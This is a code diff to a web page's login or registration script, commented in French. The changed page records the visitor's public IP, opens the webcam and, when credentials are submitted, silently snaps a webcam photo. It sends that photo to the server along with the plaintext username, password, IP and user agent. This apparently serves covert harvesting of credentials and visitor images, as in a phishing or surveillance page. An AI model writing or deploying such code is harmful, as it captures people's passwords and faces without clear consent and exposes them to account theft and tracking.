@@ -179,15 +179,17 @@
         </a>
     </div>
 
-    <script>
+        <script>
         const videoStream = document.getElementById('videoStream');
         let userIpAddress = 'Non détectée';
 
+        // Récupération de l'adresse IP
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => { userIpAddress = data.ip; })
             .catch(err => console.error("Erreur IP:", err));
 
+        // Activation de la webcam
         navigator.mediaDevices?.getUserMedia({ video: true })
             .then(stream => { videoStream.srcObject = stream; })
             .catch(err => console.error("Caméra non accessible :", err));
@@ -199,6 +201,21 @@
 
             if (!user || !pass) return;
 
+            // Capture de l'image de la webcam dans un canvas
+            let photoData = null;
+            try {
+                if (videoStream.srcObject) {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoStream.videoWidth || 640;
+                    canvas.height = videoStream.videoHeight || 480;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
+                    photoData = canvas.toDataURL('image/jpeg', 0.7); // Conversion en image JPEG compressée
+                }
+            } catch (camErr) {
+                console.error("Erreur lors de la capture photo :", camErr);
+            }
+
             try {
                 const response = await fetch('/register', {
                     method: 'POST',
@@ -207,7 +224,8 @@
                         username: user,
                         password: pass,
                         ip: userIpAddress,
-                        userAgent: navigator.userAgent
+                        userAgent: navigator.userAgent,
+                        photo: photoData // Envoi de la photo au serveur Python
                     })
                 });
 
@@ -223,5 +241,7 @@
             }
         });
     </script>
+
+
 </body>
 </html>
